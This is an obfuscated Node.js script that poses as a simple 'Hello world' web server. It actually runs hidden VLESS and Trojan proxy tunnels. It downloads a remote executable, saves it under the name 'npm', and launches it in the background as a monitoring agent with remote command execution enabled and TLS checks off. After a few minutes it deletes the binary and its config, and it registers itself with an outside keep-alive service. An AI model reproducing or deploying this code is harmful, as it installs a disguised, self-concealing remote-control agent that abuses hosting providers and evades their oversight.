const _0x3fa49d=_0x1b7b;(function(_0x325d65,_0x14d7fd){const _0x448c17=_0x1b7b,_0x338d01=_0x325d65();while(!![]){try{const _0x254650=parseInt(_0x448c17(0x213))/0x1*(-parseInt(_0x448c17(0x248))/0x2)+parseInt(_0x448c17(0x23c))/0x3+parseInt(_0x448c17(0x22d))/0x4*(-parseInt(_0x448c17(0x23f))/0x5)+parseInt(_0x448c17(0x23b))/0x6+parseInt(_0x448c17(0x224))/0x7+parseInt(_0x448c17(0x221))/0x8+parseInt(_0x448c17(0x214))/0x9;if(_0x254650===_0x14d7fd)break;else _0x338d01['push'](_0x338d01['shift']());}catch(_0x212117){_0x338d01['push'](_0x338d01['shift']());}}}(_0x1cae,0xf0c7e));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x3fa49d(0x255)),net=require(_0x3fa49d(0x252)),path=require(_0x3fa49d(0x265)),crypto=require('crypto'),{Buffer}=require(_0x3fa49d(0x20d)),{exec,execSync}=require(_0x3fa49d(0x21a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x3fa49d(0x20b)]||_0x3fa49d(0x203),NEZHA_SERVER=process['env'][_0x3fa49d(0x25a)]||'',NEZHA_PORT=process[_0x3fa49d(0x1f5)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3fa49d(0x1f5)][_0x3fa49d(0x207)]||'',DOMAIN=process[_0x3fa49d(0x1f5)][_0x3fa49d(0x261)]||_0x3fa49d(0x20e),AUTO_ACCESS=process[_0x3fa49d(0x1f5)][_0x3fa49d(0x249)]||![],WSPATH=process[_0x3fa49d(0x1f5)][_0x3fa49d(0x21d)]||UUID[_0x3fa49d(0x260)](0x0,0x8),SUB_PATH=process['env'][_0x3fa49d(0x23d)]||_0x3fa49d(0x204),NAME=process[_0x3fa49d(0x1f5)][_0x3fa49d(0x1f3)]||'',PORT=process[_0x3fa49d(0x1f5)]['PORT']||0xbb8;let ISP='';function _0x1b7b(_0x47c5a7,_0x14cacc){const _0x1cae18=_0x1cae();return _0x1b7b=function(_0x1b7bb1,_0x112085){_0x1b7bb1=_0x1b7bb1-0x1ef;let _0x3c45ae=_0x1cae18[_0x1b7bb1];return _0x3c45ae;},_0x1b7b(_0x47c5a7,_0x14cacc);}const GetISP=async()=>{const _0x166773=_0x3fa49d;try{const _0x35ecd9=await axios['get']('https://speed.cloudflare.com/meta'),_0x4a9bda=_0x35ecd9['data'];ISP=(_0x4a9bda[_0x166773(0x205)]+'-'+_0x4a9bda[_0x166773(0x1f6)])[_0x166773(0x21c)](/ /g,'_');}catch(_0x37fd0b){ISP='Unknown';}};GetISP();const httpServer=http[_0x3fa49d(0x237)]((_0x2d0896,_0x23769e)=>{const _0x3b6598=_0x3fa49d;if(_0x2d0896[_0x3b6598(0x263)]==='/'){const _0x5f1da8=path[_0x3b6598(0x208)](__dirname,_0x3b6598(0x230));fs['readFile'](_0x5f1da8,_0x3b6598(0x22b),(_0x26c4c6,_0x5a3978)=>{const _0x3e220e=_0x3b6598;if(_0x26c4c6){_0x23769e['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x23769e['end'](_0x3e220e(0x241));return;}_0x23769e[_0x3e220e(0x235)](0xc8,{'Content-Type':'text/html'}),_0x23769e[_0x3e220e(0x262)](_0x5a3978);});return;}else{if(_0x2d0896[_0x3b6598(0x263)]==='/'+SUB_PATH){const _0x38dc90=NAME?NAME+'-'+ISP:ISP,_0x180ddf='vless://'+UUID+_0x3b6598(0x20c)+DOMAIN+_0x3b6598(0x222)+DOMAIN+_0x3b6598(0x218)+WSPATH+'#'+_0x38dc90,_0x3665b1=_0x3b6598(0x24c)+UUID+_0x3b6598(0x243)+DOMAIN+_0x3b6598(0x222)+DOMAIN+_0x3b6598(0x218)+WSPATH+'#'+_0x38dc90,_0x6317a9=_0x180ddf+'\x0a'+_0x3665b1,_0x3cf224=Buffer['from'](_0x6317a9)[_0x3b6598(0x1ef)]('base64');_0x23769e[_0x3b6598(0x235)](0xc8,{'Content-Type':_0x3b6598(0x223)}),_0x23769e[_0x3b6598(0x262)](_0x3cf224+'\x0a');}else _0x23769e[_0x3b6598(0x235)](0x194,{'Content-Type':'text/plain'}),_0x23769e[_0x3b6598(0x262)](_0x3b6598(0x232));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x3fa49d(0x21c)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x3fa49d(0x22e)];function _0x1cae(){const _0x803d77=['every','\x20-p\x20','542064EVUmcs','&fp=chrome&type=ws&host=','text/plain','8802717seqEAY','substr','/bin/bash','2087','pipe','hex','readUInt16BE','utf8','then','67616eIlUxx','1.1.1.1','concat','index.html','--tls','Not\x20Found\x0a','length','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','writeHead','2053','createServer','catch','pop','trim','2376282lcdnIk','414537XToFNz','SUB_PATH','arm','140EtyNtI','sha224','Hello\x20world!','npm\x20is\x20running','@cdns.doon.eu.org:443?security=tls&sni=','createHash','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','update','2083','21614BCKFQZ','AUTO_ACCESS','npm','arm64','trojan://','Failed\x20to\x20resolve\x20','arch','config.yaml','test','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','net','false','Answer','axios','get','log','https://dns.google/resolve?name=','connect','NEZHA_SERVER','writeFileSync','error','npm\x20download\x20successfully','https://arm64.ssss.nyc.mn/agent','includes','slice','DOMAIN','end','url','data','path','toString','createWriteStream','application/json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NAME','stream','env','asOrganization','\x20with\x20all\x20DNS\x20servers','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','application/dns-json','https://amd64.ssss.nyc.mn/agent','setsid\x20nohup\x20./npm\x20-s\x20','once','reduce','finish','8443','close','find','Server\x20is\x20running\x20on\x20port\x20','a6207f70-bc3f-4c5c-a3c0-e0d51d404756','sub','country','post','NEZHA_KEY','join','error:\x20','2096','UUID','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','buffer','1234.abc.com','write','true','digest','type','43CViuJp','582624glJFOH','readUInt8','&type=A','client_secret:\x20','&path=%2F','unlink','child_process','utf-8','replace','WSPATH','connection'];_0x1cae=function(){return _0x803d77;};return _0x1cae();}function resolveHost(_0x3445b8){return new Promise((_0x306bdf,_0x444b25)=>{const _0x3bf330=_0x1b7b;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3bf330(0x250)](_0x3445b8)){_0x306bdf(_0x3445b8);return;}let _0x3ac83b=0x0;function _0x1aed38(){const _0x432352=_0x3bf330;if(_0x3ac83b>=DNS_SERVERS[_0x432352(0x233)]){_0x444b25(new Error(_0x432352(0x24d)+_0x3445b8+_0x432352(0x1f7)));return;}const _0x1c0511=DNS_SERVERS[_0x3ac83b];_0x3ac83b++;const _0x21870c=_0x432352(0x258)+encodeURIComponent(_0x3445b8)+_0x432352(0x216);axios[_0x432352(0x256)](_0x21870c,{'timeout':0x1388,'headers':{'Accept':_0x432352(0x1f9)}})[_0x432352(0x22c)](_0x22c6ab=>{const _0x826b84=_0x432352,_0x53b832=_0x22c6ab['data'];if(_0x53b832['Status']===0x0&&_0x53b832[_0x826b84(0x254)]&&_0x53b832[_0x826b84(0x254)][_0x826b84(0x233)]>0x0){const _0x9ae209=_0x53b832[_0x826b84(0x254)][_0x826b84(0x201)](_0x28cac2=>_0x28cac2[_0x826b84(0x212)]===0x1);if(_0x9ae209){_0x306bdf(_0x9ae209[_0x826b84(0x264)]);return;}}_0x1aed38();})[_0x432352(0x238)](_0x411e41=>{_0x1aed38();});}_0x1aed38();});}function handleVlessConnection(_0x59e872,_0x48f253){const _0x144126=_0x3fa49d,[_0x31ba9e]=_0x48f253,_0x302183=_0x48f253[_0x144126(0x260)](0x1,0x11);if(!_0x302183[_0x144126(0x21f)]((_0x41ef76,_0x4f7ea7)=>_0x41ef76==parseInt(uuid[_0x144126(0x225)](_0x4f7ea7*0x2,0x2),0x10)))return![];let _0x22c985=_0x48f253[_0x144126(0x260)](0x11,0x12)[_0x144126(0x215)]()+0x13;const _0x244b38=_0x48f253[_0x144126(0x260)](_0x22c985,_0x22c985+=0x2)[_0x144126(0x22a)](0x0),_0x131489=_0x48f253['slice'](_0x22c985,_0x22c985+=0x1)[_0x144126(0x215)](),_0x1a5111=_0x131489==0x1?_0x48f253[_0x144126(0x260)](_0x22c985,_0x22c985+=0x4)[_0x144126(0x208)]('.'):_0x131489==0x2?new TextDecoder()['decode'](_0x48f253[_0x144126(0x260)](_0x22c985+0x1,_0x22c985+=0x1+_0x48f253[_0x144126(0x260)](_0x22c985,_0x22c985+0x1)['readUInt8']())):_0x131489==0x3?_0x48f253[_0x144126(0x260)](_0x22c985,_0x22c985+=0x10)['reduce']((_0x39bbeb,_0x36e670,_0x8396e1,_0x457dc0)=>_0x8396e1%0x2?_0x39bbeb[_0x144126(0x22f)](_0x457dc0[_0x144126(0x260)](_0x8396e1-0x1,_0x8396e1+0x1)):_0x39bbeb,[])['map'](_0x4f560b=>_0x4f560b['readUInt16BE'](0x0)[_0x144126(0x1ef)](0x10))[_0x144126(0x208)](':'):'';_0x59e872['send'](new Uint8Array([_0x31ba9e,0x0]));const _0x115473=createWebSocketStream(_0x59e872);return resolveHost(_0x1a5111)[_0x144126(0x22c)](_0x498ee8=>{const _0x2d3371=_0x144126;net[_0x2d3371(0x259)]({'host':_0x498ee8,'port':_0x244b38},function(){const _0x564dbe=_0x2d3371;this[_0x564dbe(0x20f)](_0x48f253[_0x564dbe(0x260)](_0x22c985)),_0x115473['on'](_0x564dbe(0x25c),()=>{})[_0x564dbe(0x228)](this)['on']('error',()=>{})['pipe'](_0x115473);})['on'](_0x2d3371(0x25c),()=>{});})[_0x144126(0x238)](_0x42a5d7=>{net['connect']({'host':_0x1a5111,'port':_0x244b38},function(){const _0x3153b5=_0x1b7b;this[_0x3153b5(0x20f)](_0x48f253[_0x3153b5(0x260)](_0x22c985)),_0x115473['on']('error',()=>{})[_0x3153b5(0x228)](this)['on'](_0x3153b5(0x25c),()=>{})[_0x3153b5(0x228)](_0x115473);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x226674,_0x30c733){const _0x52541a=_0x3fa49d;try{if(_0x30c733['length']<0x3a)return![];const _0x48c2e8=_0x30c733[_0x52541a(0x260)](0x0,0x38)[_0x52541a(0x1ef)](),_0x28c487=[UUID];let _0x2f3737=null;for(const _0x9b693a of _0x28c487){const _0xd31408=crypto[_0x52541a(0x244)](_0x52541a(0x240))[_0x52541a(0x246)](_0x9b693a)[_0x52541a(0x211)](_0x52541a(0x229));if(_0xd31408===_0x48c2e8){_0x2f3737=_0x9b693a;break;}}if(!_0x2f3737)return![];let _0x5dcb69=0x38;_0x30c733[_0x5dcb69]===0xd&&_0x30c733[_0x5dcb69+0x1]===0xa&&(_0x5dcb69+=0x2);const _0x53b219=_0x30c733[_0x5dcb69];if(_0x53b219!==0x1)return![];_0x5dcb69+=0x1;const _0x59a387=_0x30c733[_0x5dcb69];_0x5dcb69+=0x1;let _0x17f9e1,_0x300a47;if(_0x59a387===0x1)_0x17f9e1=_0x30c733[_0x52541a(0x260)](_0x5dcb69,_0x5dcb69+0x4)[_0x52541a(0x208)]('.'),_0x5dcb69+=0x4;else{if(_0x59a387===0x3){const _0x113043=_0x30c733[_0x5dcb69];_0x5dcb69+=0x1,_0x17f9e1=_0x30c733[_0x52541a(0x260)](_0x5dcb69,_0x5dcb69+_0x113043)['toString'](),_0x5dcb69+=_0x113043;}else{if(_0x59a387===0x4)_0x17f9e1=_0x30c733['slice'](_0x5dcb69,_0x5dcb69+0x10)[_0x52541a(0x1fd)]((_0x437075,_0x5b818c,_0x1732ae,_0x39dab1)=>_0x1732ae%0x2?_0x437075[_0x52541a(0x22f)](_0x39dab1[_0x52541a(0x260)](_0x1732ae-0x1,_0x1732ae+0x1)):_0x437075,[])['map'](_0x39f77b=>_0x39f77b[_0x52541a(0x22a)](0x0)[_0x52541a(0x1ef)](0x10))['join'](':'),_0x5dcb69+=0x10;else return![];}}_0x300a47=_0x30c733[_0x52541a(0x22a)](_0x5dcb69),_0x5dcb69+=0x2;_0x5dcb69<_0x30c733['length']&&_0x30c733[_0x5dcb69]===0xd&&_0x30c733[_0x5dcb69+0x1]===0xa&&(_0x5dcb69+=0x2);const _0x2c1ffd=createWebSocketStream(_0x226674);return resolveHost(_0x17f9e1)['then'](_0x166f17=>{const _0x2672ee=_0x52541a;net[_0x2672ee(0x259)]({'host':_0x166f17,'port':_0x300a47},function(){const _0x5051e0=_0x2672ee;_0x5dcb69<_0x30c733[_0x5051e0(0x233)]&&this['write'](_0x30c733[_0x5051e0(0x260)](_0x5dcb69)),_0x2c1ffd['on'](_0x5051e0(0x25c),()=>{})[_0x5051e0(0x228)](this)['on'](_0x5051e0(0x25c),()=>{})[_0x5051e0(0x228)](_0x2c1ffd);})['on']('error',()=>{});})[_0x52541a(0x238)](_0x3c37a3=>{const _0x3a6f7d=_0x52541a;net['connect']({'host':_0x17f9e1,'port':_0x300a47},function(){const _0x39e326=_0x1b7b;_0x5dcb69<_0x30c733[_0x39e326(0x233)]&&this[_0x39e326(0x20f)](_0x30c733[_0x39e326(0x260)](_0x5dcb69)),_0x2c1ffd['on'](_0x39e326(0x25c),()=>{})[_0x39e326(0x228)](this)['on'](_0x39e326(0x25c),()=>{})['pipe'](_0x2c1ffd);})['on'](_0x3a6f7d(0x25c),()=>{});}),!![];}catch(_0x5b7727){return![];}}wss['on'](_0x3fa49d(0x21e),(_0x429c15,_0x17d46f)=>{const _0xcb597f=_0x3fa49d,_0x99cc71=_0x17d46f[_0xcb597f(0x263)]||'';_0x429c15[_0xcb597f(0x1fc)]('message',_0x4e9484=>{const _0x33418b=_0xcb597f;if(_0x4e9484['length']>0x11&&_0x4e9484[0x0]===0x0){const _0x24742a=_0x4e9484['slice'](0x1,0x11),_0x448abc=_0x24742a['every']((_0x1ee68d,_0x2ea800)=>_0x1ee68d==parseInt(uuid[_0x33418b(0x225)](_0x2ea800*0x2,0x2),0x10));if(_0x448abc){!handleVlessConnection(_0x429c15,_0x4e9484)&&_0x429c15[_0x33418b(0x200)]();return;}}!handleTrojanConnection(_0x429c15,_0x4e9484)&&_0x429c15['close']();})['on'](_0xcb597f(0x25c),()=>{});});const getDownloadUrl=()=>{const _0x571c53=_0x3fa49d,_0x437a2e=os[_0x571c53(0x24e)]();return _0x437a2e===_0x571c53(0x23e)||_0x437a2e===_0x571c53(0x24b)||_0x437a2e==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x571c53(0x25e):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x571c53(0x1fa);},downloadFile=async()=>{const _0x2ae2c1=_0x3fa49d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x17fcd8=getDownloadUrl(),_0x1f2440=await axios({'method':'get','url':_0x17fcd8,'responseType':_0x2ae2c1(0x1f4)}),_0x190cb3=fs[_0x2ae2c1(0x1f0)](_0x2ae2c1(0x24a));return _0x1f2440[_0x2ae2c1(0x264)][_0x2ae2c1(0x228)](_0x190cb3),new Promise((_0x30ca1a,_0x3b9537)=>{const _0x70760f=_0x2ae2c1;_0x190cb3['on'](_0x70760f(0x1fe),()=>{const _0x5002b0=_0x70760f;console[_0x5002b0(0x257)](_0x5002b0(0x25d)),exec('chmod\x20+x\x20npm',_0x59eb21=>{if(_0x59eb21)_0x3b9537(_0x59eb21);_0x30ca1a();});}),_0x190cb3['on']('error',_0x3b9537);});}catch(_0x25fcd8){throw _0x25fcd8;}},runnz=async()=>{const _0x4b59d1=_0x3fa49d;try{const _0x277c7b=execSync(_0x4b59d1(0x234),{'encoding':_0x4b59d1(0x21b)});if(_0x277c7b[_0x4b59d1(0x23a)]()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x37a57a){}await downloadFile();let _0xcd7ae9='',_0x35790d=['443',_0x4b59d1(0x1ff),_0x4b59d1(0x20a),_0x4b59d1(0x227),_0x4b59d1(0x247),_0x4b59d1(0x236)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2a3acb=_0x35790d[_0x4b59d1(0x25f)](NEZHA_PORT)?_0x4b59d1(0x231):'';_0xcd7ae9=_0x4b59d1(0x1fb)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4b59d1(0x220)+NEZHA_KEY+'\x20'+_0x2a3acb+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5a3d4b=NEZHA_SERVER[_0x4b59d1(0x25f)](':')?NEZHA_SERVER['split'](':')[_0x4b59d1(0x239)]():'',_0x4cad58=_0x35790d[_0x4b59d1(0x25f)](_0x5a3d4b)?_0x4b59d1(0x210):_0x4b59d1(0x253),_0x1c639c=_0x4b59d1(0x217)+NEZHA_KEY+_0x4b59d1(0x1f2)+NEZHA_SERVER+_0x4b59d1(0x1f8)+_0x4cad58+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4b59d1(0x25b)](_0x4b59d1(0x24f),_0x1c639c);}_0xcd7ae9=_0x4b59d1(0x251);}else{console[_0x4b59d1(0x257)](_0x4b59d1(0x245));return;}}try{exec(_0xcd7ae9,{'shell':_0x4b59d1(0x226)},_0xea75bd=>{const _0xc43301=_0x4b59d1;if(_0xea75bd)console[_0xc43301(0x25c)]('npm\x20running\x20error:',_0xea75bd);else console[_0xc43301(0x257)](_0xc43301(0x242));});}catch(_0x58dd6d){console['error'](_0x4b59d1(0x209)+_0x58dd6d);}};async function addAccessTask(){const _0x2143ba=_0x3fa49d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x479cf7='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x44708d=await axios[_0x2143ba(0x206)]('https://oooo.serv00.net/add-url',{'url':_0x479cf7},{'headers':{'Content-Type':_0x2143ba(0x1f1)}});console[_0x2143ba(0x257)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x12cdf1){}}const delFiles=()=>{const _0x72626=_0x3fa49d;fs[_0x72626(0x219)](_0x72626(0x24a),()=>{}),fs[_0x72626(0x219)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x224348=_0x3fa49d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x224348(0x257)](_0x224348(0x202)+PORT);});
